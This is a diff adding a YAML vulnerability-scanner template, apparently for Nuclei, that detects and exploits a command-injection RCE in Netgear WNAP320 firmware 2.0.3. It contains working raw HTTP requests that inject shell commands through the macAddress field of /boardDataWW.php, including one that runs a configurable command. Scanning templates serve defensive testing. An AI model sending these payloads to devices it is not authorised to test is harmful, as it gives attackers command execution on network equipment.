@@ -1,0 +1,71 @@
+id: netgear-wnap320-rce
+
+info:
+  name: Netgear WNAP320 Access Point Firmware Version 2.0.3 RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Netgear WNAP320 has a security vulnerability that allows attackers to execute arbitrary code by exploiting a command injection flaw in the firmware.
+  reference:
+    - https://www.exploit-db.com/exploits/50069
+    - https://github.com/nobodyatall648/Netgear-WNAP320-Firmware-Version-2.0.3-RCE
+  tags: rce, netgear
+
+variables:
+  cmd: "id"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /boardDataWW.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        macAddress=112233445566%3Becho+randstr_%3E+.%2Foutput+%23&reginfo=0&writeData=Submit
+    matchers:
+      - type: word
+        words:
+          - "randstr_"
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - randstr_(\w+)
+        internal: true
+
+  - raw:
+      - |
+        GET /output HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        words:
+          - "randstr_"
+        part: body
+
+  - raw:
+      - |
+        POST /boardDataWW.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        macAddress=112233445566%3B{{cmd}}+%3E+.%2Foutput+%23&reginfo=0&writeData=Submit
+
+  - raw:
+      - |
+        GET /output HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        words:
+          - "uid="
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "uid=(\\d+)"
